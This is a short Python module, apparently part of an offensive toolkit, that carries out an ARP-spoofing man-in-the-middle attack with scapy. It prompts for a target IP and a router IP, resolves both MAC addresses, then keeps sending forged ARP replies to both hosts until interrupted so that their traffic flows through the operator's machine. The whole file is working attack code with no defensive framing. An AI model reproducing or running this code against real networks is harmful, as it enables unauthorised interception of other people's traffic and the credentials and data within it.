from scapy.all import ARP, send, Ether, srp
import time
import sys
from rich.console import Console
from core.ui import draw_header

console = Console()


def get_mac(ip):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") /
                 ARP(pdst=ip), timeout=2, verbose=False)
    if ans:
        return ans[0][1].hwsrc
    return None


def mitm_attack():
    draw_header("MITM Engine")
    target = console.input("[bold yellow]Target IP: [/bold yellow]")
    router = console.input("[bold yellow]Router IP: [/bold yellow]")

    t_mac = get_mac(target)
    r_mac = get_mac(router)

    if not t_mac or not r_mac:
        console.print(
            "[red]Failure: MAC resolution failed. Host might be down.[/red]")
        return

    console.print(
        f"[bold red][!] Intercepting: {target} <--> {router}[/bold red]")
    console.print(
        "[dim]Note: Ensure IP Forwarding is ON in your OS settings.[/dim]")

    try:
        while True:
            # Poisoning the Target
            send(ARP(op=2, pdst=target, hwdst=t_mac, psrc=router), verbose=False)
            # Poisoning the Router
            send(ARP(op=2, pdst=router, hwdst=r_mac, psrc=target), verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        console.print("\n[yellow]Restoring network integrity...[/yellow]")
        send(ARP(op=2, pdst=target, hwdst="ff:ff:ff:ff:ff:ff",
             psrc=router, hwsrc=r_mac), count=5, verbose=False)
